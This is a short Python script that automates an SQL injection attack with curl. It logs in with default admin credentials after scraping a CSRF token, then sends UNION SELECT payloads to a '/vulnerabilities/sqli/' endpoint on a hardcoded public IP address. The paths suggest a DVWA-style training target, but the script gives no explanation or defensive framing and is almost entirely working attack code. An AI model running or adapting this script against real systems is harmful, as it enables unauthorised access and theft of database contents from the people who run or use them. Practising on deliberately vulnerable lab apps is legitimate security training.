
import subprocess
import re

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in")

# Step 3: Test different ID values to trigger the SQL query
test_ids = ["1", "999", "999 UNION SELECT 1,2,3", "999 UNION SELECT 1,2,3,4"]

for test_id in test_ids:
    # URL encode the payload
    import urllib.parse
    encoded_id = urllib.parse.quote(test_id)
    
    cmd = [
        'curl',
        '-s',
        '-b', '/tmp/cookies.txt',
        f'http://31.97.117.123/vulnerabilities/sqli/?id={encoded_id}'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    
    # Look for pre section
    if '<pre>' in result.stdout:
        start = result.stdout.find('<pre>')
        end = result.stdout.find('</pre>', start) + 6
        section = result.stdout[start:end]
        print(f"\n[+] ID={test_id}:")
        print(section)
    else:
        print(f"\n[-] No results for ID={test_id}")

